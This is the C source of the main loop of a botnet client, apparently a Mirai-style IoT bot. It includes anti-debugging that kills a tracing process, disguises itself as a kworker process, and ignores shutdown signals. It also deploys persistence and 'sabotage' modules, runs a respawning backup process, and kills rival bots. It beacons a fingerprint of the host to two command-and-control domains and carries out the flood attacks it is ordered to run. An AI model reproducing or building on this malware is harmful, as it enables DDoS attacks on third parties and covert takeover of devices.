#include "utils/headers/includes.h"
#include "utils/headers/util.h"
#include "utils/headers/syscalls.h"
#include "utils/headers/checksum.h"
#include "utils/headers/protocols.h"
#include "utils/headers/resolver.h"
#include "utils/headers/ssl.h"
#include "encryption/chacha20_table.h"
#include "encryption/chacha20/chacha20.h"
#include "utils/headers/rand.h"
#include "modules/singleinstance/headers/tcp.h"
#include "modules/attack/attack.h"
#ifdef KILLER
#include "modules/persistence/headers/killer.h"
#endif
#include "modules/persistence/headers/persistence.h"
#include "modules/persistence/headers/sabotage.h"

void killer_kill_bash_sh_once(void);


int main(int argc, char **args);

void __attribute__((naked)) _start(void) {
    __asm__ __volatile__(
#if defined(__x86_64__)
        "mov (%rsp), %rdi\n"
        "lea 8(%rsp), %rsi\n"
        "push %rax\n" /* Align stack to 16 bytes for C ABI */
        "jmp _start_c\n"
#elif defined(__i386__)
        "movl (%esp), %eax\n"
        "leal 4(%esp), %edx\n"
        "andl $-16, %esp\n"    /* Align stack to 16 bytes */
        "subl $8, %esp\n"      /* Padding for alignment */
        "pushl %edx\n"         /* argv */
        "pushl %eax\n"         /* argc */
        "call _start_c\n"
#elif defined(__arm__)
        "mov r2, sp\n"       /* Save original stack pointer */
        "bic sp, sp, #7\n"    /* Align stack to 8 bytes for EABI */
        "ldr r0, [r2]\n"      /* argc */
        "add r1, r2, #4\n"    /* argv */
        "bl _start_c\n"      /* Linker-friendly call */
        "mov r0, #0\n"        /* exit status 0 */
        "mov r7, #1\n"        /* __NR_exit */
        "swi #0\n"
#elif defined(__mips__)
        "lw $4, 0($sp)\n"
        "addiu $5, $sp, 4\n"
        "li $8, -8\n"
        "and $sp, $sp, $8\n"
        "jal _start_c\n"
        "nop\n"
#elif defined(__powerpc__)
        "mr 3, 1\n"
        "lwz 4, 0(3)\n"
        "addi 5, 3, 4\n"
        "mr 3, 4\n"
        "mr 4, 5\n"
        "bl _start_c\n"
#elif defined(__sh__)
        "mov r15, r4\n"
        "mov.l @r15, r4\n"
        "add #4, r15\n"
        "mov r15, r5\n"
        "mov.l 1f, r0\n"
        "jsr @r0\n"
        "nop\n"
        ".align 2\n"
        "1: .long _start_c\n"
#elif defined(__sparc__)
        "ld [%sp+64], %o0\n"
        "add %sp, 68, %o1\n"
        "sethi %hi(_start_c), %g1\n"
        "or %g1, %lo(_start_c), %g1\n"
        "jmp %g1\n"
        "nop\n"
#else
        "bl _start_c\n"
#endif
    );
}

void kill_tracer_immediate(void) {
    char path[64];
    sys_sprintf(path, enc[PROC_STATUS_FMT].string, sys_getpid());
    int fd = sys_open(path, O_RDONLY, 0);
    if (fd >= 0) {
        char buf[1024] = {0};
        sys_read(fd, buf, sizeof(buf)-1);
        sys_close(fd);

        char *tracer = sys_strstr(buf, enc[TRACER_PID].string);
        if (tracer) {
            tracer += strlen(enc[TRACER_PID].string);
            while (*tracer == ' ' || *tracer == '\t') tracer++;
            int pid = atoi(tracer);
            if (pid != 0) {
                sys_kill(pid, SIGKILL);
                sys_exit(0); // Tracer detected, kill tracer and exit to be safe
            }
        }
    }
}


void _start_c(int argc, char **argv) {
    xor_init();
    rand_init();
#ifdef DEBUG
    sys_printf("xor and rand initialised\n");
#endif
    sys_exit(main(argc, argv));
}

#ifdef LOCKER
#include "modules/persistence/headers/locker.h"
#endif
#include "utils/headers/util.h"
#include "utils/headers/resolver.h"
#include "modules/debug.h"

static void connection_fail(void);
static void connection_create(void);
static void connection_destroy(void);
static void authentication_create(char *, char *, char *);

static void ensure_bind(uint32_t);
static int current_proc_num = 200;

void set_proc_name(int argc, char **argv) {
    char name[16];
    memset(name, 0, 16);

    char *kw = enc[KWORKER_STR].string;
    char *slash = enc[SLASH_ZERO_COLON].string;
    char num_buf[8];
    memset(num_buf, 0, 8);
    itoa(current_proc_num, 10, num_buf);

    int kw_len   = (kw    && *kw)    ? (int)strlen(kw)    : 0;
    int sl_len   = (slash && *slash) ? (int)strlen(slash) : 0;
    int num_len  = (int)strlen(num_buf);
    if (kw_len  > 11) kw_len  = 11;
    if (sl_len  > 2)  sl_len  = 2;
    if (num_len > 2)  num_len = 2;
    if (kw_len  > 0) memcpy(name,                   kw,      kw_len);
    if (sl_len  > 0) memcpy(name + kw_len,           slash,   sl_len);
    if (num_len > 0) memcpy(name + kw_len + sl_len,  num_buf, num_len);
    name[15] = 0;

    _syscall5(__NR_prctl, 15, (long)(unsigned long)name, 0, 0, 0);
    sys_printf("prctl set name to: %s\n", name);

    if (argv != NULL && argv[0] != NULL) {
        int i;
        for (i = 1; i < argc; i++) {
            if (argv[i] != NULL)
                memset(argv[i], 0, strlen(argv[i]));
        }
        size_t a0len = strlen(argv[0]);
        if (a0len > 0) {
            memset(argv[0], 0, a0len);
            size_t copy = strlen(name);
            if (copy > a0len) copy = a0len;
            memcpy(argv[0], name, copy);
        }
    }
}

struct sockaddr_in srv_addr;
int esi_fd = -1, c2_fd = -1, proxy_c2_fd = -1, fails = 0;
int bot_argc;
char **bot_argv;
int connected = FALSE;
int backup_pid = -1;
uint32_t local_addr;


/*
static int send_all(int fd, const uint8_t *buf, int len, int flags)
{
    sys_printf("send_all() called with fd=%d, len=%d\n", fd, len);
    int sent = 0;
    int eagain_spins = 0;
    int ret;
    while (sent < len)
    {
        ret = sys_sendto(fd, (void *)(buf + sent), len - sent, flags, NULL, 0);
        if (ret <= 0)
        {
            if (ret < 0 && (errno == EAGAIN || errno == EWOULDBLOCK))
            {
                if (eagain_spins++ < 1000) {
                    sys_usleep(100);
                    continue;
                }
            }
            return -1;
        }
        sent += ret;
        eagain_spins = 0;
    }
    return 0;
}

static int recv_all(int fd, uint8_t *buf, int len, int flags)
{
    sys_printf("recv_all() called with fd=%d, len=%d\n", fd, len);
    int got = 0;
    int ret;
    while (got < len)
    {
        ret = sys_recvfrom(fd, buf + got, len - got, flags, NULL, NULL);
        if (ret <= 0)
        {
            if (ret == 0)
                return 0;
            if (errno == EINTR || errno == EAGAIN || errno == EWOULDBLOCK)
                continue;
            if (got > 0) {
                char hex[128]; memset(hex, 0, 128);
                for(int i=0; i<got && i<60; i++) sys_sprintf(hex + i*2, "%02x", buf[i]);
                debug("recv_all: partial data: %s\n", hex);
            }
            return -1;
        }
        got += ret;
    }
    debug("recv_all() length raw bytes: %02x %02x\n", buf[0], buf[1]);
    return 1;
}*/

char *getArch()
{ 
    sys_printf("getArch() called\n");
#if defined(__x86_64__) || defined(_M_X64)
    return enc[ARCH_X86].string;
#elif defined(i386) || defined(__i386__) || defined(__i386) || defined(_M_IX86)
    return enc[ARCH_X86].string;
#elif defined(__ARM_ARCH_2__)
    return enc[ARCH_ARM].string;
#elif defined(__ARM_ARCH_3__) || defined(__ARM_ARCH_3M__)
    return enc[ARCH_ARM].string;
#elif defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T)
    return enc[ARCH_ARM].string;
#elif defined(__ARM_ARCH_5_) || defined(__ARM_ARCH_5E_)
    return enc[ARCH_ARM].string;
#elif defined(__ARM_ARCH_6T2_) || defined(__ARM_ARCH_6T2_)
    return enc[ARCH_ARM].string;
#elif defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6Z__) || defined(__ARM_ARCH_6ZK__)
    return enc[ARCH_ARM].string;
#elif defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
    return enc[ARCH_ARM].string;
#elif defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
    return enc[ARCH_ARM].string;
#elif defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
    return enc[ARCH_ARM].string;
#elif defined(__ARM_ARCH_7M__)
    return enc[ARCH_ARM].string;
#elif defined(__ARM_ARCH_7S__)
    return enc[ARCH_ARM].string;
#elif defined(__aarch64__)
    return enc[ARCH_ARM].string;
#elif defined(__arm__) || defined(__ARM_EABI__) || defined(__TARGET_ARCH_ARM)
    return enc[ARCH_ARM].string;
#elif defined(mips) || defined(__mips__) || defined(__mips)
    return enc[ARCH_MIPS].string;
#elif defined(__sh__)
    return enc[ARCH_SH4].string;
#elif defined(__powerpc) || defined(__powerpc__) || defined(__powerpc64__) || defined(__POWERPC__) || defined(__ppc__) || defined(__PPC__) || defined(_ARCH_PPC)
    return enc[ARCH_PPC].string;
#elif defined(__PPC64__) || defined(__ppc64__) || defined(_ARCH_PPC64)
    return enc[ARCH_PPC].string;
#elif defined(__sparc__) || defined(__sparc)
    return enc[ARCH_SPC].string;
#elif defined(__m68k__)
    return enc[ARCH_M68K].string;
#else
    return enc[ARCH_UNK].string;
#endif
}

static int domain_idx = 0;

struct resolved *resolve_addr(const char *hostname)
{
    srv_addr.sin_family = AF_INET;
    srv_addr.sin_port = htons(C2_PORT);

    struct resolved *entries = NULL;
    int domain_id = (domain_idx % 2 == 0) ? C2_DOMAIN_1 : C2_DOMAIN_2;
    
    debug(enc[MSG_RESOLVING_C2].string, (int)domain_id);
    entries = lookup_domain(enc[domain_id].string);
    
    if (entries == NULL)
    {
        domain_id = (domain_id == C2_DOMAIN_1) ? C2_DOMAIN_2 : C2_DOMAIN_1;
        debug(enc[MSG_RESOLVE_FAIL].string, (int)domain_id);
        entries = lookup_domain(enc[domain_id].string);
    }

    if (entries != NULL)
    {
        srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
        debug(enc[MSG_RESOLVE_SUCCESS].string, (int)domain_id);
        free_entries(entries);
    }
    else
    {
#ifdef KILLER
        killer_destroy();
#endif
        return NULL;
    }
    domain_idx++;
}

static void connection_create(void)
{
    sys_printf("connection_create: creating socket\n");
    if ((c2_fd = sys_socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        sys_printf("connection_create: sys_socket failed\n");
        return;
    }
    sys_printf("connection_create: socket created, c2_fd = %d\n", c2_fd);

    sys_fcntl(c2_fd, F_SETFL, O_NONBLOCK);

    struct resolved *resolved_entries = resolve_addr(enc[C2_DOMAIN_1].string);

    connected = FALSE;

    sys_printf("connection_create: attempting to connect\n");
    if (sys_connect(c2_fd, (struct sockaddr *)&srv_addr, sizeof(struct sockaddr_in)) == -1)
    {
        sys_printf("connection_create: sys_connect failed, errno: %d\n", errno);
        sys_close(c2_fd);
        c2_fd = -1;
        connection_fail();
        return;
    }
    sys_printf("connection_create: connection successful\n");
}

static void connection_destroy(void)
{
    if (c2_fd != -1)
        sys_close(c2_fd);
    c2_fd = -1;

    connected = FALSE;

    sys_usleep(5000000);
}

static void connection_fail()
{
#ifdef KILLER
    fails++;
    if (fails >= 10)
    {
        killer_destroy();
    }
#endif
}

static void spawn_backup()
{
#ifndef DEBUG
    backup_pid = sys_fork();
    if (backup_pid == 0)
    {
        /* I am the backup process (proc2) */
        while (1)
        {
            if (sys_getppid() == 1)
            {
                /* Main process (proc1) died! Respawn it. */
                sys_execve(bot_argv[0], bot_argv, NULL);
                sys_exit(0);
            }
            sys_usleep(2000000);
        }
    }
#endif
}

static void verify_backup()
{
#ifndef DEBUG
    if (backup_pid <= 0 || sys_kill(backup_pid, 0) == -1)
    {
        spawn_backup();
    }
#endif
}

int GetTotalRAM()
{
    struct sysinfo info;
    if (sys_sysinfo(&info) != 0)
    {
        return 0;
    }

    int totalRAM = (int)(info.totalram * info.mem_unit / (1024 * 1024));
    return totalRAM;
}

static void authentication_create(char *arch, char *version, char *identifier)
{
    char cores_tmp[16];
    char ram_tmp[16];
    char identifier_tmp[256];
    char root_tmp[4];
    char spoof_tmp[4];

    strcpy(identifier_tmp, identifier);
    strcpy(root_tmp, enc[STRING_1].string);
    strcpy(spoof_tmp, enc[STRING_0].string);

    itoa((int)sys_sysconf(_SC_NPROCESSORS_ONLN), 10, cores_tmp);
    itoa((int)GetTotalRAM(), 10, ram_tmp);
    char *cores = cores_tmp;
    char *ram = ram_tmp;

    uint8_t identifier_len = strlen(identifier);
    uint8_t arch_len = strlen(arch);
    uint8_t version_len = strlen(version);
    uint8_t cores_len = strlen(cores);
    uint8_t ram_len = strlen(ram);
    uint8_t root_len = strlen(root_tmp);
    uint8_t spoof_len = strlen(spoof_tmp);
    debug("auth_pkt details: arch_len=%d, version_len=%d, cores_len=%d, ram_len=%d, identifier_len=%d, root_len=%d, spoof_len=%d\n", arch_len, version_len, cores_len, ram_len, identifier_len, root_len, spoof_len);
    /* Encrypt fields in place */
    chacha20_xor(key, 1, nonce, cores, cores, cores_len);
    chacha20_xor(key, 1, nonce, ram, ram, ram_len);
    if (identifier_len > 0)
        chacha20_xor(key, 1, nonce, identifier_tmp, identifier_tmp, identifier_len);
    chacha20_xor(key, 1, nonce, root_tmp, root_tmp, root_len);
    chacha20_xor(key, 1, nonce, spoof_tmp, spoof_tmp, spoof_len);

    /* Build single packet buffer */
    static uint8_t pkt[512];
    int pos = 0;

    /* Magic header: 0x00000001 */
    pkt[pos++] = 0x00; pkt[pos++] = 0x00; pkt[pos++] = 0x00; pkt[pos++] = 0x01;

    /* arch (unencrypted) */
    pkt[pos++] = arch_len;
    memcpy(pkt + pos, arch, arch_len); pos += arch_len;

    /* version (unencrypted) */
    pkt[pos++] = version_len;
    memcpy(pkt + pos, version, version_len); pos += version_len;

    /* cores (encrypted) */
    pkt[pos++] = cores_len;
    memcpy(pkt + pos, cores, cores_len); pos += cores_len;

    /* ram (encrypted) */
    pkt[pos++] = ram_len;
    memcpy(pkt + pos, ram, ram_len); pos += ram_len;

    /* identifier (encrypted) */
    pkt[pos++] = identifier_len;
    if (identifier_len > 0) { memcpy(pkt + pos, identifier_tmp, identifier_len); pos += identifier_len; }

    /* root (encrypted) */
    pkt[pos++] = root_len;
    memcpy(pkt + pos, root_tmp, root_len); pos += root_len;

    /* spoof (encrypted) */
    pkt[pos++] = spoof_len;
    memcpy(pkt + pos, spoof_tmp, spoof_len); pos += spoof_len;

    debug(enc[MSG_AUTH_START].string, pos);
    if (sys_sendto(c2_fd, pkt, pos, MSG_NOSIGNAL, (struct sockaddr *)&srv_addr, sizeof(srv_addr)) == -1)
    {
        debug(enc[MSG_CONN_FAIL].string, errno);
        connection_destroy();
        return;
    }

    fails = 0;
    connected = 1;
    debug("Connected to the command & control server!\r\n");
}


void __attribute__((constructor)) early_init(int argc, char **argv, char **envp)
{
#ifdef KILLER
    killer_create(argv);
#endif
    set_proc_name(0, NULL);
}

int main(int argc, char **args)
{
    xor_init();
    if (enc == NULL) return 1;

    if (argc > 0 && args[0] != NULL) {
        if (sys_strstr(args[0], enc[IDENT_KILL].string) || sys_strstr(args[0], enc[IDENT_PKILL].string) ||
            sys_strstr(args[0], enc[IDENT_PGREP].string)) {
            debug(enc[MSG_ANTI_BOT].string);
            return 0;
        }
    }

    sys_signal(SIGINT, SIG_IGN);
    sys_signal(SIGTERM, SIG_IGN);
    sys_signal(SIGHUP, SIG_IGN);
    sys_signal(SIGQUIT, SIG_IGN);
    sys_signal(SIGPIPE, SIG_IGN);

    set_oom_protection();
    bot_argc = argc;
    bot_argv = args;
#ifndef DEBUG
    sys_chdir(enc[ROOT_DIR].string);
#endif


    char *tbl_exec_succ;
    char name_buf[32];
    char identifier[32];
    int name_buf_len;
    int tbl_exec_succ_len;
    int pgid, pings = 0;
    fflush(stdout);

#if 0
    {
        char *kw = enc[KWORKER_STR].string;
        char stealth_path[32];
        strcpy(stealth_path, enc[TMP_DIR].string);
        strcat(stealth_path, kw);
        strcat(stealth_path, enc[STRING_UNDERSCORE_1].string);
        char self_path[256] = {0};
        ssize_t self_len = sys_readlink(enc[PROC_SELF_EXE].string, self_path, sizeof(self_path)-1);
        if (self_len > 0) {
            self_path[self_len] = '\0';
            if (strcmp(self_path, stealth_path) != 0) {
                int src = sys_open(self_path, 0 /*O_RDONLY*/, 0);
                int dst = sys_open(stealth_path, 0x41 /*O_WRONLY|O_CREAT|O_TRUNC*/, 0755);
                if (src >= 0 && dst >= 0) {
                    char buf[4096]; int n;
                    while ((n = sys_read(src, buf, sizeof(buf))) > 0) sys_write(dst, buf, n);
                    sys_close(src); sys_close(dst);
                    char *new_argv[argc + 1];
                    new_argv[0] = (char *)stealth_path;
                    for (int i = 1; i < argc; i++) new_argv[i] = args[i];
                    new_argv[argc] = NULL;
                    sys_execve(stealth_path, new_argv, NULL);
                }
                if (src >= 0) sys_close(src);
                if (dst >= 0) sys_close(dst);
            }
        }
    }
#endif
    local_addr = _local_addr();
    debug(enc[MSG_LOCAL_ADDR].string, CONVERT_ADDR(local_addr));
    debug("%s\n", enc[MSG_PERSISTENCE].string);
    persistence_deploy(args[0]);
    debug("%s\n", enc[MSG_SABOTAGE].string);
    sabotage_deploy();

    memset(identifier, 0, 32);
    if (argc == 2 && strlen(args[1]) < 32)
    {
        strcpy(identifier, args[1]);
        memset(args[1], 0, strlen(args[1]));
    }
    else
    {
        if (enc[UNDEFINED].string && *enc[UNDEFINED].string)
            strcpy(identifier, enc[UNDEFINED].string);
        else
            strcpy(identifier, "undefined");
    }

    rand_init();
    set_proc_name(bot_argc, bot_argv);
    printf("%s\n", enc[EXECUTE_MESSAGE].string);

    sys_signal(SIGCHLD, SIG_IGN);

#ifndef DEBUG
    if (sys_fork() > 0)
        return 0;

    /* Create the backup process (proc2) */
    spawn_backup();

    set_proc_name(bot_argc, bot_argv);
    pgid = sys_setsid();
    sys_close(STDIN);
    sys_close(STDOUT);
    sys_close(STDERR);
#endif

    floods_init();

    sys_printf("floods_init completed\n");
    rand_init();
    debug("%s\n", enc[MSG_CONNECTED].string);
    sys_printf("entering main loop\n");
    while (TRUE)
    {
        fd_set read_set, write_set;
        struct timeval timeout;
        int max_fds, ret;

        FD_ZERO(&read_set);
        FD_ZERO(&write_set);

        if (c2_fd == -1)
        {
            debug(enc[MSG_C2_RECONNECT].string);
            sys_printf("calling connection_create\n");
            connection_create();
            sys_printf("connection_create returned\n");
        }

        sys_printf("c2_fd = %d, connected = %d\n", c2_fd, connected);
        
        // Skip sys_select if c2_fd is invalid
        if (c2_fd == -1) {
            sys_printf("c2_fd is invalid, skipping sys_select and retrying\n");
            sys_usleep(5000000); // Sleep 5 seconds before retry
            continue;
        }
        
        FD_SET(c2_fd, (connected ? &read_set : &write_set));

        max_fds = c2_fd;
        sys_printf("max_fds = %d\n", max_fds);

        timeout.tv_usec = 0;
        timeout.tv_sec = 5;

        debug(enc[MSG_SELECT_START].string);
        sys_printf("about to call sys_select\n");

        /* Ensure proc2 is alive */
        verify_backup();

        sys_printf("calling sys_select with max_fds=%d, timeout %d seconds\n", max_fds + 1, timeout.tv_sec);
        ret = sys_select(max_fds + 1, &read_set, &write_set, NULL, &timeout);
        sys_printf("sys_select returned: %d, errno: %d\n", ret, errno);
        if (ret == -1)
        {
            if (errno == EINTR) 
            {
                debug("sys_select() interrupted by sys_signal(EINTR)\n");
                continue;
            }
            debug("sys_select() error: %d\n", errno);
            sys_usleep(1000);
            continue;
        }

        if (ret == 0)
        {
            uint16_t len = 0;
            debug(enc[MSG_SELECT_TIMEOUT].string);
            if (pings++ % 6 == 0)
                sys_sendto(c2_fd, &len, sizeof(len), MSG_NOSIGNAL, NULL, 0);
            continue;
        }

        debug(enc[MSG_SELECT_RET].string, ret, FD_ISSET(c2_fd, &read_set), FD_ISSET(c2_fd, &write_set));


        if (FD_ISSET(c2_fd, &write_set))
        {
            int err = 0;
            socklen_t err_len = sizeof(err);

            debug("c2_fd is writable, checking status\n");
            int n = sys_getsockopt(c2_fd, SOL_SOCKET, SO_ERROR, &err, &err_len);

            if (err != 0 || n != 0)
            {
                debug(enc[MSG_CONN_FAIL].string, err);
                connection_destroy();
            }
            else
            {
                debug("Starting authentication...\n");
                /* Non-blocking connect phase is done; use blocking I/O for stable C2 stream. */
                int cur_flags = sys_fcntl(c2_fd, F_GETFL, 0);
                if (cur_flags != -1)
                    sys_fcntl(c2_fd, F_SETFL, cur_flags & ~O_NONBLOCK);

                authentication_create(getArch(), enc[MALWARE_VERSION].string, identifier);
            }
        }

        if (!connected)
        {
            continue;
        }

        if (FD_ISSET(c2_fd, &read_set))
        {
            uint16_t len __attribute__((aligned(4)));
            static char rdbuf[8192] __attribute__((aligned(4)));

            // Read command length (2 bytes)
            errno = 0;
            ret = sys_recv(c2_fd, (uint8_t *)&len, sizeof(len), 0);
            if (ret <= 0)
            {
                debug(enc[MSG_RECV_ERR].string, ret, errno);
                if (ret == 0)
                {
                    debug("CNC closed connection cleanly (recv=0)\n");
                    connection_destroy();
                    continue;
                }
                debug("Disconnected from the command & control server while reading length.\n");
                connection_destroy();
                continue;
            }

            {
                uint8_t *raw_len = (uint8_t *)&len;
                debug("recv_all() length raw bytes: %02x %02x\n", raw_len[0], raw_len[1]);
            }

            if (len == 0)
                continue; // Ping

            len = ntohs(len);
            if (len > sizeof(rdbuf))
            {
                debug("Invalid command length: %u\n", len);
                connection_destroy();
                continue;
            }

            // Read command data (exactly 'len' bytes)
            ret = sys_recv(c2_fd, (uint8_t *)rdbuf, len, 0);
            if (ret <= 0)
            {
                debug(enc[MSG_RECV_ERR].string, ret, errno);
                connection_destroy();
                continue;
            }

            if (len > 0)
            {
                uint16_t time_val;
                memcpy(&time_val, rdbuf + 1, 2);
                time_val = ntohs(time_val);
                
                debug(enc[MSG_COMMAND_RECVD].string, (uint8_t)rdbuf[0], len, (uint32_t)time_val);
                
                for(int i = 0; i < len && i < 16; i++) {
                    printf(enc[FMT_HEX_DUMP].string, (uint8_t)rdbuf[i]);
                }
                printf("\n");
                
                flood_parse(rdbuf, len);
            }
        }
    main_loop_continue:
#ifdef KILLER
        if (!is_killer_running()) killer_create(bot_argv);
#endif
        continue;
    }

    sys_exit(0);
}

